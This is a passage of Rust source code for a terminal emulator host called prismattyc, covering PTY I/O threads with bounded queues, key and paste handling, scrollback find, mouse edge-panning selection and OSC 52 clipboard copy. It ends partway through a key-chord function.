use std::collections::{BTreeMap, BTreeSet};
use std::env;
use std::io::{self, IsTerminal, Read, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;
#[cfg(unix)]
use std::sync::Once;
use std::thread;
use std::time::{Duration, Instant};

use anyhow::{bail, Context, Result};
use crossterm::cursor::{Hide, Show};
use crossterm::event::{
    self, DisableBracketedPaste, EnableBracketedPaste, Event, KeyCode, KeyEvent, KeyEventKind,
    KeyModifiers, KeyboardEnhancementFlags, MouseButton, MouseEvent, MouseEventKind,
    PopKeyboardEnhancementFlags, PushKeyboardEnhancementFlags,
};
use crossterm::execute;
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, size, EnterAlternateScreen, LeaveAlternateScreen,
};
use portable_pty::PtySize;
use prismattyc_core::{encode_osc52_clipboard, HistoryMatch, Selection};

mod splash;
use prismattyc_emulator::{Emulator, PtySession};
use prismattyc_protocol::{
    decode_body, encode_capability_reply, CapabilityReply, CollectedApc, ControlMessage, Feature,
    RegionKind, StyledRun, DEFAULT_LIMIT_REGIONS, LIMIT_REGIONS, MAX_CELL_RECT_ATTACHMENTS,
};
use prismattyc_render::{AnsiRenderer, CellRectOverlay, OverlayRun};

const MAX_SCROLLBACK_LINES: usize = 10_000;
/// Bounded outstanding writes to the child PTY (stdin bytes + control replies).
///
/// **Key bursts** coalesce encoded bytes and poll `try_send` under one short
/// total budget. This prevents ordinary typed bursts from losing bytes while
/// keeping the event loop bounded when the child is not reading.
///
/// **Capability replies, focus reports, and mouse reports** remain non-blocking
/// `try_send` operations. They are control traffic and may drop under extreme
/// flood rather than stall the event loop.
///
/// **Paste** uses chunked polled `try_send` under its own short total budget.
const CHILD_WRITE_QUEUE_CAP: usize = 32;
/// Bounded child→host output queue. Reader thread blocks on full (backpressure)
/// so heap growth from PTY floods is capped at CAP × chunk size.
const FROM_PTY_QUEUE_CAP: usize = 64;
/// Hard caps on grid geometry: outer resize of 65535×65535 must not OOM.
const MAX_TERM_COLS: u16 = 512;
const MAX_TERM_ROWS: u16 = 256;
/// Cap paste payload before normalize (event-loop DoS). Truncate at a char boundary.
const MAX_PASTE_BYTES: usize = 1024 * 1024;
/// Max bytes per host→child paste queue message. Large pastes are split so the
/// writer thread can drain while later chunks enqueue.
const PASTE_CHUNK_BYTES: usize = 4 * 1024;
/// Max encoded key bytes coalesced into one host→child queue message.
/// A bounded burst buffer avoids moving the queue's memory problem into the
/// event loop.
const KEY_BURST_MAX_BYTES: usize = 4 * 1024;
/// Total wall-clock budget for enqueueing one coalesced key burst.
const KEY_SEND_BUDGET: Duration = Duration::from_millis(250);
/// Total wall-clock budget for enqueueing one paste. Caps how long paste can
/// stall the event loop when the child is slow/stuck.
const PASTE_SEND_BUDGET: Duration = Duration::from_millis(250);
/// Extra wait when closing a partially-delivered bracketed paste (`CSI 201 ~`).
const PASTE_BRACKET_CLOSE_TIMEOUT: Duration = Duration::from_millis(50);
/// Sleep between `try_send` polls while waiting for queue space (key bursts
/// and paste). Keeps CPU calm without relying on unstable
/// `SyncSender::send_timeout`.
const PASTE_POLL_INTERVAL: Duration = Duration::from_millis(2);
/// Progressive edge-pan while left-drag selecting (hold-still or Drag at edge).
/// Starts slow for precision; ramps only after a sustained hold so short aims
/// do not overshoot (dogfood: MARK_MID → MARK_OLD).
fn edge_pan_profile(ticks_at_edge: u32) -> (usize /* step */, Duration /* min interval */) {
    match ticks_at_edge {
        0..=10 => (1, Duration::from_millis(48)), // ~21 rows/s — aim carefully
        11..=25 => (2, Duration::from_millis(36)), // ~55 rows/s
        _ => (3, Duration::from_millis(30)),      // ~100 rows/s — long haul
    }
}
/// Max from-PTY messages drained per outer-loop tick. Without a budget, a
/// continuous flood (`yes`, tight writers) keeps the bounded queue non-empty so
/// an unbounded `try_recv` drain never returns to the outer loop — signal exit
/// and paint starve (flood). Budget forces a yield each tick.
const MAX_PTY_DRAIN_PER_TICK: usize = 32;

/// True while this process owns outer raw/alt/mouse/bracketed-paste modes.
/// Cleared by the first successful `restore_host_terminal_once` (Drop or tests).
static HOST_TERMINAL_OWNED: AtomicBool = AtomicBool::new(false);

/// Set by Unix SIGINT/SIGTERM/SIGHUP handlers; main loop exits so `TerminalGuard`
/// Drop restores the outer TTY. Handlers only store this flag (async-signal-safe).
static SIGNAL_REQUESTED_EXIT: AtomicBool = AtomicBool::new(false);

fn main() -> Result<()> {
    prismattyc_mux::release_update::forward_installed("prismattyc")?;
    let argv: Vec<String> = env::args().collect();
    if argv.get(1).map(String::as_str) == Some("update") {
        return prismattyc_mux::run_update(argv.iter().skip(2));
    }
    let cli = Cli::parse(env::args_os().skip(1))?;
    if splash::should_show(cli.explicit_program, cli.no_splash)
        && splash::run(prismattyc_core::package_version())? == splash::Outcome::Quit
    {
        return Ok(());
    }
    let host_size = size().context("failed to read host terminal size")?;
    let (mut columns, mut rows) = usable_terminal_size(host_size);
    let pty_size = PtySize {
        rows,
        cols: columns,
        pixel_width: 0,
        pixel_height: 0,
    };
    let mut session = PtySession::spawn(&cli.program, &cli.child_args, pty_size)
        .with_context(|| format!("failed to launch {:?} in a PTY", cli.program))?;
    let mut child_writer = session.take_input_writer()?;
    let mut pty_reader = session.take_reader()?;
    let _terminal_guard = TerminalGuard::enter()?;

    // Single PTY writer thread multiplexes keyboard bytes and capability replies.
    // Capability grants are applied only after a successful write.
    let (to_child_tx, to_child_rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
    let (grant_tx, grant_rx) = mpsc::sync_channel::<CapabilityGrant>(8);
    thread::spawn(move || {
        while let Ok(msg) = to_child_rx.recv() {
            if child_writer.write_all(&msg.bytes).is_err() {
                break;
            }
            let _ = child_writer.flush();
            if let Some(grant) = msg.capability_grant {
                let _ = grant_tx.try_send(grant);
            }
        }
    });

    // PTY reader thread — bounded queue; blocks on full (backpressure), never
    // grows an unbounded heap. Event loop drains with try_recv.
    let (from_pty_tx, from_pty_rx) =
        mpsc::sync_channel::<std::io::Result<Vec<u8>>>(FROM_PTY_QUEUE_CAP);
    thread::spawn(move || {
        let mut buffer = [0_u8; 16 * 1024];
        loop {
            match pty_reader.read(&mut buffer) {
                Ok(0) => {
                    let _ = from_pty_tx.send(Ok(Vec::new()));
                    break;
                }
                Ok(count) => {
                    if from_pty_tx.send(Ok(buffer[..count].to_vec())).is_err() {
                        break;
                    }
                }
                Err(error) if error.raw_os_error() == Some(5) => {
                    let _ = from_pty_tx.send(Ok(Vec::new()));
                    break;
                }
                Err(error) => {
                    let _ = from_pty_tx.send(Err(error));
                    break;
                }
            }
        }
    });

    let mut emulator = if cli.experimental_rich {
        Emulator::new_experimental(columns.into(), rows.into(), MAX_SCROLLBACK_LINES)
    } else {
        Emulator::new(columns.into(), rows.into(), MAX_SCROLLBACK_LINES)
    };
    let mut renderer = AnsiRenderer::new(io::stdout().lock());
    let mut rich = RichSession::default();
    let mut selection = Selection::default();
    // When true, plain arrow keys extend the host selection (set by Ctrl+Space
    // or the first Shift+arrow). Esc clears.
    let mut keyboard_select_mode = false;
    let mut multi_click = MultiClick::default();
    // Rows above the live bottom currently shown (0 = follow live)..
    let mut view_scroll: usize = 0;
    // Set when child output arrives while scrolled; cleared on return to live.
    let mut history_new_output = false;
    let mut needs_paint = true;
    let mut last_content_epoch = emulator.screen().content_epoch();
    // EOF/disconnect is deferred until after the current drain finishes and a
    // final paint runs. Fast children (printf) can queue data + empty EOF
    // together; returning on EOF before paint drops the last frame.
    let mut pending_child_exit: Option<Option<io::Error>> = None;
    let key_debug = env_flag_enabled("PRISMATTYC_KEY_DEBUG");
    // Scroll chrome (chip + title): default on; opt out via env (see ScrollChrome).
    let scroll_chrome = ScrollChrome::from_env();
    let mut find = FindMode::default();
    // Continuous edge autoscroll while left-drag selecting at top/bottom.
    let mut edge_pan = EdgePanDrag::default();
    // Consecutive forwarded keys stay here until the host event queue reaches
    // a non-key boundary or goes idle. One budget applies to the whole burst.
    let mut pending_key_bytes = Vec::with_capacity(KEY_BURST_MAX_BYTES);

    loop {
        // Unix terminate signals set a flag only (no TTY I/O in the handler).
        // Exit the loop so `TerminalGuard` Drop restores host modes once.
        // Do not block on a live child — Drop must restore outer TTY promptly
        // (hang: SIGTERM to prism only leaves interactive children alive).
        // Normal child-EOF still waits after `pending_child_exit` below.
        if signal_exit_requested() {
            return Ok(());
        }

        // apply capability grants only after the writer thread flushed them.
        while let Ok(grant) = grant_rx.try_recv() {
            rich.apply_grant(grant);
        }

        if pending_child_exit.is_none() {
            let mut drained = 0usize;
            loop {
                // Check inside the drain: continuous PTY floods keep the queue
                // non-empty so try_recv never returns Empty; without this check
                // (and the budget below) SIGTERM never reaches the outer loop.
                if signal_exit_requested() {
                    return Ok(());
                }
                if drained >= MAX_PTY_DRAIN_PER_TICK {
                    // Yield to outer loop so signal / paint / host poll get a turn.
                    break;
                }
                match from_pty_rx.try_recv() {
                    Ok(Ok(bytes)) if bytes.is_empty() => {
                        // Keep draining already-queued messages; paint; then wait.
                        note_clean_child_exit(&mut pending_child_exit);
                    }
                    Ok(Ok(bytes)) => {
                        if cli.experimental_rich {
                            flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
                            process_rich_chunk(&mut emulator, &mut rich, &to_child_tx, &bytes);
                        } else {
                            let _ = emulator.feed(&bytes);
                            // Preserve key-before-reply ordering when a PTY
                            // response is ready before the next host event.
                            flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
                            drain_emulator_replies(&mut emulator, &to_child_tx);
                        }
                        // Drop host selection when the grid under it may have changed
                        // (text selection: child output invalidates finished ranges).
                        // Mid-drag (`active` + anchor) is kept so continuous echo
                        // does not thrash highlight every put_char restarts
                        // if a clear still wipes the anchor.
                        let epoch = emulator.screen().content_epoch();
                        let epoch_changed = epoch != last_content_epoch;
                        if epoch_changed {
                            last_content_epoch = epoch;
                        }
                        if should_clear_selection_on_child_output(
                            &selection,
                            keyboard_select_mode,
                            epoch_changed,
                        ) {
                            selection.clear();
                            keyboard_select_mode = false;
                        }
                        // Clamp history view if scrollback shrank (ring) or grew.
                        let max_scroll = emulator.screen().max_view_scroll();
                        if view_scroll > 0 {
                            history_new_output = true;
                        }
                        view_scroll = view_scroll.min(max_scroll);
                        needs_paint = true;
                        drained += 1;
                    }
                    Ok(Err(error)) => {
                        note_child_read_error(&mut pending_child_exit, error);
                    }
                    Err(mpsc::TryRecvError::Empty) => break,
                    Err(mpsc::TryRecvError::Disconnected) => {
                        // Sticky: a prior PTY read error must not become clean success.
                        note_clean_child_exit(&mut pending_child_exit);
                        break;
                    }
                }
            }
        }

        if needs_paint {
            paint(
                &mut renderer,
                &emulator,
                &rich,
                &selection,
                view_scroll,
                history_new_output,
                scroll_chrome,
                &find,
                cli.experimental_rich,
            )?;
            needs_paint = false;
        }

        if let Some(read_error) = pending_child_exit.take() {
            flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
            let _ = session.wait();
            return match read_error {
                Some(error) => Err(error).context("failed to read child PTY"),
                None => Ok(()),
            };
        }

        // Consume any event crossterm already parsed, without blocking. A
        // non-blocking poll cannot spin on EOF (one pass, then returns false),
        // so the idle wait below owns the timeout and hangup detection.
        if event::poll(Duration::ZERO).context("poll host events")? {
            match event::read().context("read host event")? {
                Event::Key(key)
                    if key.kind == KeyEventKind::Press
                        || key.kind == KeyEventKind::Repeat
                        || (key.kind == KeyEventKind::Release
                            && emulator.keyboard_reports_event_types()) =>
                {
                    if key_debug {
                        log_key_debug(&key);
                    }
                    edge_pan.clear();
                    if handle_host_key_with_pending(
                        key,
                        &mut selection,
                        &mut keyboard_select_mode,
                        &mut view_scroll,
                        &mut find,
                        &emulator,
                        &to_child_tx,
                        &mut pending_key_bytes,
                    )? {
                        needs_paint = true;
                    }
                    if view_scroll == 0 {
                        history_new_output = false;
                    }
                }
                Event::Mouse(mouse) => {
                    flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
                    if handle_mouse(
                        mouse,
                        &mut selection,
                        &mut multi_click,
                        &mut keyboard_select_mode,
                        &mut view_scroll,
                        &emulator,
                        &to_child_tx,
                        &mut edge_pan,
                    )? {
                        needs_paint = true;
                    }
                    if view_scroll == 0 {
                        history_new_output = false;
                    }
                }
                Event::FocusGained => {
                    flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
                    if emulator.focus_report() {
                        let _ = to_child_tx.try_send(ChildWrite::bytes(b"\x1b[I".to_vec()));
                    }
                }
                Event::FocusLost => {
                    flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
                    if emulator.focus_report() {
                        let _ = to_child_tx.try_send(ChildWrite::bytes(b"\x1b[O".to_vec()));
                    }
                }
                Event::Resize(new_cols, new_rows) => {
                    flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
                    edge_pan.clear();
                    let (c, r) = usable_terminal_size((new_cols, new_rows));
                    if c != columns || r != rows {
                        // Fail-closed: PTY winsize first; only then mutate emulator.
                        let _ = apply_host_resize_fail_closed(
                            || {
                                session.resize(PtySize {
                                    rows: r,
                                    cols: c,
                                    pixel_width: 0,
                                    pixel_height: 0,
                                })
                            },
                            || {
                                columns = c;
                                rows = r;
                                emulator.resize(columns.into(), rows.into());
                                selection.clear();
                                keyboard_select_mode = false;
                                view_scroll = view_scroll.min(emulator.screen().max_view_scroll());
                                last_content_epoch = emulator.screen().content_epoch();
                                needs_paint = true;
                            },
                        );
                    }
                }
                Event::Paste(text) => {
                    // Keys first, then paste (CSI 200~ is the first byte of
                    // the paste message). Locked by
                    // pending_key_burst_flushes_before_bracketed_paste.
                    flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
                    // chunked paste with short budget; BEL on drop/partial.
                    // Empty paste (image-only clipboard) becomes a temp PNG path.
                    let text = prismattyc_mux::expand_empty_paste(&text, session.process_id())
                        .unwrap_or(text);
                    let _ = handle_paste(&text, emulator.bracketed_paste(), &to_child_tx);
                }
                Event::Key(_) => {
                    flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
                }
            }
        } else {
            // No immediate host event means the current key burst is ready to
            // submit before the bounded idle wait.
            flush_pending_key_bytes(&mut pending_key_bytes, &to_child_tx);
            if wait_host_input_hangup(16) {
                // Host TTY hung up with no SIGHUP (nested prism, no controlling
                // terminal): exit so `TerminalGuard` Drop restores modes once.
                // Owning this 16ms wait replaces crossterm's poll, whose read would
                // otherwise free-run on the EOF'd fd at 100% CPU.
                return Ok(());
            }
        }
        // Hold-still edge pan: keep scrolling while left-drag sits on top/bottom.
        if edge_pan.tick(&mut selection, &mut view_scroll, &emulator) {
            needs_paint = true;
            if view_scroll == 0 {
                history_new_output = false;
            }
        }
    }
}

/// Tracks left-button host selection drag for continuous edge autoscroll.
#[derive(Debug, Default, Clone)]
struct EdgePanDrag {
    /// True after left-down on the host selection path until left-up / cancel.
    active: bool,
    view_row: usize,
    view_col: usize,
    last_tick: Option<Instant>,
    /// Consecutive successful edge pans (resets when pointer leaves the edge).
    ticks_at_edge: u32,
}

impl EdgePanDrag {
    fn clear(&mut self) {
        *self = Self::default();
    }

    fn note_pointer(&mut self, view_row: usize, view_col: usize, term_rows: usize) {
        self.active = true;
        let was_edge = term_rows > 0 && (self.view_row == 0 || self.view_row + 1 >= term_rows);
        self.view_row = view_row;
        self.view_col = view_col;
        let now_edge = term_rows > 0 && (view_row == 0 || view_row + 1 >= term_rows);
        // Leaving the edge resets the ramp so the next aim starts slow again.
        if was_edge && !now_edge {
            self.ticks_at_edge = 0;
            self.last_tick = None;
        }
    }

    /// Apply one edge pan using the progressive profile. Returns whether
    /// `view_scroll` changed.
    fn pan_once(
        &mut self,
        selection: &mut Selection,
        view_scroll: &mut usize,
        emulator: &Emulator,
        at_top: bool,
    ) -> bool {
        let (step, _) = edge_pan_profile(self.ticks_at_edge);
        let max = emulator.screen().max_view_scroll();
        let before = *view_scroll;
        if at_top {
            *view_scroll = (*view_scroll).saturating_add(step).min(max);
        } else {
            *view_scroll = view_scroll.saturating_sub(step);
        }
        if *view_scroll == before {
            return false;
        }
        self.ticks_at_edge = self.ticks_at_edge.saturating_add(1);
        self.last_tick = Some(Instant::now());
        let abs = emulator
            .screen()
            .abs_row_at_view(*view_scroll, self.view_row);
        if selection.anchor.is_some() {
            selection.active = true;
            selection.update(abs, self.view_col);
            selection.dragged = true;
        }
        true
    }

    /// Pan history while the pointer is held on the top/bottom edge.
    ///
    /// Runs on the main loop tick so a **stationary** hold still scrolls.
    /// Rate and step follow [`edge_pan_profile`] (slow start, then ramp).
    fn tick(
        &mut self,
        selection: &mut Selection,
        view_scroll: &mut usize,
        emulator: &Emulator,
    ) -> bool {
        if !self.active || emulator.screen().alt_active() {
            return false;
        }
        // Only while a host drag selection is in progress.
        if !selection.active && !selection.dragged {
            return false;
        }
        let rows = emulator.screen().rows();
        if rows == 0 {
            return false;
        }
        let at_top = self.view_row == 0;
        let at_bottom = self.view_row + 1 >= rows;
        if !at_top && !at_bottom {
            self.ticks_at_edge = 0;
            return false;
        }
        let (_, interval) = edge_pan_profile(self.ticks_at_edge);
        let now = Instant::now();
        if let Some(prev) = self.last_tick {
            if now.duration_since(prev) < interval {
                return false;
            }
        }
        self.pan_once(selection, view_scroll, emulator, at_top)
    }
}

/// Host chrome while reading scrollback (opt-out via env).
#[derive(Debug, Clone, Copy)]
struct ScrollChrome {
    /// Bottom-right inverse ` N/M ` chip.
    chip: bool,
    /// OSC window title `prismattyc — scroll N/M`.
    title: bool,
}

impl ScrollChrome {
    fn from_env() -> Self {
        Self {
            // PRISMATTYC_SCROLL_CHIP=0|false|off disables the on-screen chip.
            chip: env_flag_enabled_default_true("PRISMATTYC_SCROLL_CHIP"),
            // PRISMATTYC_SCROLL_TITLE=0|false|off disables the window title updates.
            title: env_flag_enabled_default_true("PRISMATTYC_SCROLL_TITLE"),
        }
    }
}

/// Incremental find over primary history (host chords; see [`is_find_chord`]).
#[derive(Debug, Default, Clone)]
struct FindMode {
    active: bool,
    query: String,
    /// Last match for find next / previous (case-insensitive by default).
    last: Option<HistoryMatch>,
    /// 1-based index and total match count for chrome (`2/5`); `None` on miss.
    rank: Option<(usize, usize)>,
}

#[allow(clippy::too_many_arguments)] // paint is a single composition root call site
fn paint(
    renderer: &mut AnsiRenderer<io::StdoutLock<'_>>,
    emulator: &Emulator,
    rich: &RichSession,
    selection: &Selection,
    view_scroll: usize,
    history_new_output: bool,
    scroll_chrome: ScrollChrome,
    find: &FindMode,
    experimental_rich: bool,
) -> Result<()> {
    // Hide host caret for every full-grid paint. enter_host_modes only
    // hides once at enter; after the first Show the outer host caret trails.
    // Re-show after CUP so the child REPL caret is visible at the emulated cell.
    execute!(io::stdout(), Hide).context("hide host caret before paint")?;
    // Primary-buffer overlays never paint on alt (matrix F4 isolation).
    let on_alt = emulator.screen().alt_active();
    // History view: paint scrollback window; selection chrome allowed.
    let scroll = if on_alt {
        0
    } else {
        view_scroll.min(emulator.screen().max_view_scroll())
    };
    if scroll > 0 {
        let sel = selection.range();
        let max = emulator.screen().max_view_scroll();
        renderer
            .render_scrolled(emulator.screen(), scroll, false, sel)
            .context("render scrollback view")?;
        // Always hide caret while reading history.
        execute!(io::stdout(), Hide).context("hide caret in scrollback view")?;
        if scroll_chrome.title {
            sync_host_title(scroll, max, history_new_output);
        }
        // Find prompt first (left), then chip last so CSI-K on the prompt does not
        // erase the bottom-right scroll chip (dual-sign review note).
        if find.active {
            paint_find_prompt(
                emulator.screen().rows(),
                emulator.screen().columns(),
                &find.query,
                find.rank,
                scroll_chrome.chip,
            )?;
        }
        if scroll_chrome.chip {
            paint_scroll_status_chrome(
                emulator.screen().rows(),
                emulator.screen().columns(),
                scroll,
                max,
                history_new_output,
            )?;
        }
        return Ok(());
    }
    if scroll_chrome.title {
        sync_host_title(0, emulator.screen().max_view_scroll(), false);
    }
    let sel = if on_alt { None } else { selection.range() };
    if experimental_rich && !on_alt {
        let overlays = overlays_from(&rich.attachments, emulator.screen().rows());
        if overlays.is_empty() && sel.is_none() {
            renderer
                .render(emulator.screen())
                .context("render classic fast path")?;
        } else {
            renderer
                .render_composed(emulator.screen(), &overlays, sel)
                .context("render with selection/overlays")?;
        }
    } else if sel.is_none() {
        renderer
            .render(emulator.screen())
            .context("render classic fast path")?;
    } else {
        renderer
            .render_composed(emulator.screen(), &[], sel)
            .context("render classic with selection")?;
    }
    // Honor DECTCEM: show host caret only when the child has not hidden it.
    // Find mode owns the bottom row chrome and keeps the host caret hidden.
    if find.active {
        paint_find_prompt(
            emulator.screen().rows(),
            emulator.screen().columns(),
            &find.query,
            find.rank,
            false,
        )?;
        execute!(io::stdout(), Hide).context("hide caret in find mode")?;
        return Ok(());
    }
    if emulator.cursor_visible() {
        execute!(io::stdout(), Show).context("show host caret after paint")?;
    } else {
        execute!(io::stdout(), Hide).context("keep host caret hidden (DECTCEM off)")?;
    }
    io::stdout()
        .write_all(emulator.cursor_shape().decscusr_steady_bytes())
        .context("emit DECSCUSR for outer caret")?;
    Ok(())
}

#[cfg(test)]
/// Compatibility wrapper for unit tests and synchronous callers that process
/// one key at a time. The main loop uses the pending-burst variant below.
fn handle_host_key(
    key: KeyEvent,
    selection: &mut Selection,
    keyboard_select_mode: &mut bool,
    view_scroll: &mut usize,
    find: &mut FindMode,
    emulator: &Emulator,
    to_child: &mpsc::SyncSender<ChildWrite>,
) -> Result<bool> {
    let mut pending_key_bytes = Vec::with_capacity(KEY_BURST_MAX_BYTES);
    let result = handle_host_key_with_pending(
        key,
        selection,
        keyboard_select_mode,
        view_scroll,
        find,
        emulator,
        to_child,
        &mut pending_key_bytes,
    );
    flush_pending_key_bytes(&mut pending_key_bytes, to_child);
    result
}

/// Host keys: selection shortcuts stay local; other keys forward to the child.
///
/// Policy: `docs/input.md` (clean-room; original code).
/// Returns whether a repaint is needed.
#[allow(clippy::too_many_arguments)]
fn handle_host_key_with_pending(
    key: KeyEvent,
    selection: &mut Selection,
    keyboard_select_mode: &mut bool,
    view_scroll: &mut usize,
    find: &mut FindMode,
    emulator: &Emulator,
    to_child: &mpsc::SyncSender<ChildWrite>,
    pending_key_bytes: &mut Vec<u8>,
) -> Result<bool> {
    // Alt screen (vim/less/htop): paint already hides selection. Refuse host
    // selection gestures and copy chords so Ctrl+C reaches the child as ^C
    //. Clear any stale primary-buffer selection left over from enter.
    // No host scrollback view on alt — leave view_scroll alone (clamped at paint).
    if emulator.screen().alt_active() {
        let had = selection.range().is_some() || *keyboard_select_mode || find.active;
        selection.clear();
        *keyboard_select_mode = false;
        *view_scroll = 0;
        find.active = false;
        find.query.clear();
        find.last = None;
        find.rank = None;
        if let Some(bytes) = encode_key_to_pty(key, emulator.keyboard_flags()) {
            queue_key_bytes(pending_key_bytes, bytes, to_child);
        }
        return Ok(had);
    }

    // Find mode captures keys (does not forward to child).
    if find.active {
        let result = handle_find_key(key, find, selection, view_scroll, emulator);
        flush_pending_key_bytes(pending_key_bytes, to_child);
        return result;
    }

    // Open scrollback find (host-local). Multiple chords: outer hosts (esp. Kitty)
    // often steal Ctrl+Shift+F.
    if is_find_chord(key) {
        find.active = true;
        find.query.clear();
        find.last = None;
        find.rank = None;
        flush_pending_key_bytes(pending_key_bytes, to_child);
        return Ok(true);
    }

    // host history pan (not forwarded to child):
    // - Shift+PageUp/Down — page
    // - Shift+Home/End — oldest / live
    // - Ctrl+Shift+Up/Down — one line (common terminal chord)
    // Bare PageUp/PageDown/Home/End/arrows still go to the child (less/vim).
    if is_scrollback_key(key) {
        let page = emulator.screen().rows().saturating_sub(1).max(1);
        let max = emulator.screen().max_view_scroll();
        let before = *view_scroll;
        match key.code {
            KeyCode::PageUp => *view_scroll = (*view_scroll).saturating_add(page).min(max),
            KeyCode::PageDown => *view_scroll = view_scroll.saturating_sub(page),
            KeyCode::Home => *view_scroll = max, // oldest history
            KeyCode::End => *view_scroll = 0,    // live bottom
            KeyCode::Up => *view_scroll = (*view_scroll).saturating_add(1).min(max),
            KeyCode::Down => *view_scroll = view_scroll.saturating_sub(1),
            _ => {}
        }
        if *view_scroll != before {
            selection.clear();
            *keyboard_select_mode = false;
            flush_pending_key_bytes(pending_key_bytes, to_child);
            return Ok(true);
        }
        flush_pending_key_bytes(pending_key_bytes, to_child);
        return Ok(false);
    }

    // Host clipboard / selection ownership **before** jump-to-live.
    // While scrolled, clearing view_scroll first used to drop multi-cell history
    // selections and forward Ctrl+C as ETX (dual-sign review FAIL @ 5f5cd42;
    // README + text selection D-H3/D-H4). Preserve scroll for extract_text_view.
    //
    // Copy → OSC 52 to the *host* terminal (Kitty/Ghostty clipboard).
    // - Ctrl+Shift+C: classic terminal copy chord (when the outer host delivers it).
    // - Ctrl+C with multi-cell selection: copy, not interrupt (one-cell mark
    //   does not claim Ctrl+C).
    if is_copy_chord(key, selection_claims_ctrl_c(selection)) {
        copy_selection_osc52(selection, emulator, *view_scroll)?;
        flush_pending_key_bytes(pending_key_bytes, to_child);
        return Ok(false);
    }

    // Ctrl+Shift+A: select entire viewport (not Ctrl+A — that is readline BOL).
    if is_select_all_chord(key) {
        if let Some(r) = emulator.screen().viewport_range() {
            // Select visible viewport as absolute history rows.
            let scroll = (*view_scroll).min(emulator.screen().max_view_scroll());
            let a0 = emulator.screen().abs_row_at_view(scroll, r.start_row);
            let a1 = emulator.screen().abs_row_at_view(scroll, r.end_row);
            selection.set_range(a0, r.start_col, a1, r.end_col);
            *keyboard_select_mode = true;
            copy_selection_osc52(selection, emulator, *view_scroll)?;
            flush_pending_key_bytes(pending_key_bytes, to_child);
            return Ok(true);
        }
        flush_pending_key_bytes(pending_key_bytes, to_child);
        return Ok(false);
    }

    // Esc: clear host selection + leave keyboard-select mode (stay scrolled).
    if matches!(key.code, KeyCode::Esc) && (selection.range().is_some() || *keyboard_select_mode) {
        selection.clear();
        *keyboard_select_mode = false;
        flush_pending_key_bytes(pending_key_bytes, to_child);
        return Ok(true);
    }

    // Typing / other non-owned keys while reading history jump back to live
    // (common terminal UX) so the user sees the caret and new output.
    if *view_scroll > 0 {
        *view_scroll = 0;
        selection.clear();
        *keyboard_select_mode = false;
        // Fall through: still handle the key (forward / mark / motion / etc.).
    }

    // Ctrl+Space (or Ctrl+2 / NUL): drop mark at caret and enter select mode.
    // Reliable when the host never reports SHIFT on arrows (common without full
    // keyboard-protocol pass-through).
    if is_mark_key(key) {
        let caret = emulator.screen().cursor();
        let abs = emulator.screen().abs_row_at_view(0, caret.row);
        selection.begin(abs, caret.column);
        selection.dragged = true; // paintable one-cell mark
        *keyboard_select_mode = true;
        flush_pending_key_bytes(pending_key_bytes, to_child);
        return Ok(true);
    }

    // Grow selection: Shift+motion always; plain motion while select mode is on.
    // Motion includes arrows, Home/End, PageUp/PageDown (text selection D-H2).
    if is_selection_motion(key, *keyboard_select_mode) {
        *keyboard_select_mode = true;
        let result = extend_selection_keyboard(selection, emulator, key.code, view_scroll);
        flush_pending_key_bytes(pending_key_bytes, to_child);
        return Ok(result);
    }

    // Typing/other keys leave select mode but keep a finished selection until Esc
    // (unless we forward and the child redraws — then content_epoch clears it).
    if *keyboard_select_mode && !is_selection_motion_code(key.code) && key.code != KeyCode::Esc {
        *keyboard_select_mode = false;
        selection.finish();
    }

    if let Some(bytes) = encode_key_to_pty(key, emulator.keyboard_flags()) {
        queue_key_bytes(pending_key_bytes, bytes, to_child);
    }
    Ok(false)
}

fn is_mark_key(key: KeyEvent) -> bool {
    if !key.modifiers.contains(KeyModifiers::CONTROL)
        || key.modifiers.contains(KeyModifiers::ALT)
        || key.modifiers.contains(KeyModifiers::SHIFT)
    {
        return false;
    }
    matches!(
        key.code,
        KeyCode::Char(' ') | KeyCode::Char('2') | KeyCode::Null | KeyCode::Char('\0')
    )
}

/// Host scrollback navigation: Shift+PageUp/Down/Home/End.
///
/// Requires SHIFT so bare PageUp/PageDown/Home/End still reach the child
/// (less/vim/readline).
fn is_scrollback_key(key: KeyEvent) -> bool {
    if key.modifiers.contains(KeyModifiers::ALT) {
        return false;
    }
    let shift = key.modifiers.contains(KeyModifiers::SHIFT);
    let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);
    if !shift {
        return false;
    }
    match key.code {
        // Shift+Page/Home/End (no Ctrl) — page / jump
        KeyCode::PageUp | KeyCode::PageDown | KeyCode::Home | KeyCode::End if !ctrl => true,
        // Ctrl+Shift+Up/Down — one line
        KeyCode::Up | KeyCode::Down if ctrl => true,
        _ => false,
    }
}

/// text selection clear-on-output: drop finished ranges / select-mode when the child
/// mutates the grid. Keep an in-progress mouse drag so flood echo does not
/// thrash highlight every `put_char` (still restarts via if cleared).
fn should_clear_selection_on_child_output(
    selection: &Selection,
    keyboard_select_mode: bool,
    epoch_changed: bool,
) -> bool {
    let mid_drag = selection.active && selection.anchor.is_some();
    !mid_drag && (epoch_changed || selection.range().is_some() || keyboard_select_mode)
}

/// Open host find.
///
/// Outer hosts steal many “standard” chords (Kitty: Ctrl+Shift+F does nothing
/// useful for us; Ctrl+Shift+/ often runs a kitten and shows “pattern not found”).
/// Prefer punctuation that reaches Prismattyc:
/// - **Ctrl+Shift+;** (primary under Kitty — confirmed dogfood)
/// - **Ctrl+Shift+'** / **Ctrl+Shift+.** (extra fallbacks)
/// - **Ctrl+Shift+F** / **/** still accepted if the outer host delivers them
fn is_find_chord(key: KeyEvent) -> bool {
    if !key.modifiers.contains(KeyModifiers::CONTROL)
        || !key.modifiers.contains(KeyModifiers::SHIFT)
        || key.modifiers.contains(KeyModifiers::ALT)
    {
        return false;
    }
    matches!(
        key.code,
        KeyCode::Char('f')
            | KeyCode::Char('F')
            | KeyCode::Char('/')
            | KeyCode::Char('?')
            | KeyCode::Char(';')
            | KeyCode::Char(':')
